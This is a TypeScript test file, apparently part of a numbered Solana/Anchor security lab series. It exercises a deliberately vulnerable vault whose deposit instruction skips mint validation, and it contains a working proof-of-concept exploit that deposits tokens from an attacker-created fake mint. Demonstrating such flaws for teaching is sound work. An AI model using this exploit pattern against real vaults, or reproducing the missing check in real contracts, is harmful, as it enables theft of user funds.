/**
 * EXPLOIT TEST: Missing Mint Validation (Anchor)
 * 
 * This test demonstrates that the vulnerable vault accepts deposits of ANY token mint,
 * not just the one it was initialized to accept.
 * 
 * Vulnerability: The `deposit` instruction checks that the target token account is owned by the vault,
 * but fails to check that the token account's MINT matches the vault's `token_mint`.
 * 
 * Exploit Scenario:
 * 1. Vault is initialized with USDC (Good Token).
 * 2. Attacker creates "FakeToken" and mints 1,000,000 to themselves.
 * 3. Attacker creates a Vault Token Account for "FakeToken".
 * 4. Attacker deposits "FakeToken" into the Vault.
 * 5. The instruction succeeds, polluting the vault (and potentially granting credit in a stateful system).
 */

import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { PublicKey, Keypair, SystemProgram } from "@solana/web3.js";
import {
    createMint,
    createAccount,
    mintTo,
    TOKEN_PROGRAM_ID,
    getAccount
} from "@solana/spl-token";
import { BN } from "bn.js";

describe("06-missing-mint-validation: Anchor Exploit", () => {
    const provider = anchor.AnchorProvider.env();
    anchor.setProvider(provider);

    const PROGRAM_ID = new PublicKey("VULN6mintVa11d1d1d1d1d1d1d1d1d1d1d1d1d1d1");

    it("Accepts deposit of Fake Tokens (Mint Mismatch)", async () => {
        console.log("\nüéØ EXPLOIT: Missing Mint Validation (Anchor)\n");

        const idl = await Program.fetchIdl(PROGRAM_ID, provider);
        if (!idl) {
            throw new Error("IDL not found. Make sure the program is deployed.");
        }
        const program = new Program(idl, PROGRAM_ID, provider);

        const user = Keypair.generate();
        console.log("üë§ User:", user.publicKey.toBase58());

        // Airdrop SOL
        const airdropSig = await provider.connection.requestAirdrop(
            user.publicKey,
            2 * 1000000000 // 2 SOL
        );
        await provider.connection.confirmTransaction(airdropSig);

        // 1. Create GOOD Mint (e.g., USDC)
        const goodMint = await createMint(
            provider.connection,
            user,
            user.publicKey,
            null,
            6
        );
        console.log("üíé Good Mint:", goodMint.toBase58());

        // 2. Initialize Vault with GOOD Mint
        const [vaultPda] = PublicKey.findProgramAddressSync(
            [Buffer.from("vault"), goodMint.toBuffer()],
            PROGRAM_ID
        );
        console.log("üè¶ Vault PDA:", vaultPda.toBase58());

        await program.methods
            .initializeVault(goodMint)
            .accounts({
                payer: user.publicKey,
                vault: vaultPda,
                tokenMint: goodMint,
                systemProgram: SystemProgram.programId,
            })
            .signers([user])
            .rpc();

        // 3. Create BAD Mint (FakeToken)
        console.log("\nüòà Creating Fake Token Mint...");
        const badMint = await createMint(
            provider.connection,
            user,
            user.publicKey,
            null,
            6
        );
        console.log("üí© Bad Mint:", badMint.toBase58());

        // 4. Create Token Accounts for BAD Mint
        // User's Bad Token Account
        const userBadTokenAccount = await createAccount(
            provider.connection,
            user,
            badMint,
            user.publicKey
        );

        // Vault's Bad Token Account (Attacker creates this for the vault)
        const vaultBadTokenAccount = await createAccount(
            provider.connection,
            user,
            badMint,
            vaultPda // Owned by Vault
        );

        // Mint some Fake Tokens to user
        await mintTo(
            provider.connection,
            user,
            badMint,
            userBadTokenAccount,
            user,
            1000000
        );

        // 5. EXPLOIT: Deposit Fake Tokens
        console.log("\nüö® Attempting to deposit Fake Tokens...");
        const depositAmount = new BN(500000);

        try {
            await program.methods
                .deposit(depositAmount)
                .accounts({
                    user: user.publicKey,
                    vaultTokenAccount: vaultBadTokenAccount, // üö® Pass BAD Token Account
                    vault: vaultPda,
                    userTokenAccount: userBadTokenAccount,   // üö® Pass BAD Token Account
                    tokenProgram: TOKEN_PROGRAM_ID,
                })
                .signers([user])
                .rpc();

            console.log("üí• EXPLOIT SUCCESSFUL!");
            console.log("   The vault accepted tokens from the WRONG mint.");

            const vaultBadBalance = await getAccount(provider.connection, vaultBadTokenAccount);
            console.log(`   Vault Fake Token Balance: ${vaultBadBalance.amount.toString()}`);

        } catch (e) {
            console.error("‚ùå Exploit failed?", e);
            throw e;
        }
    });
});
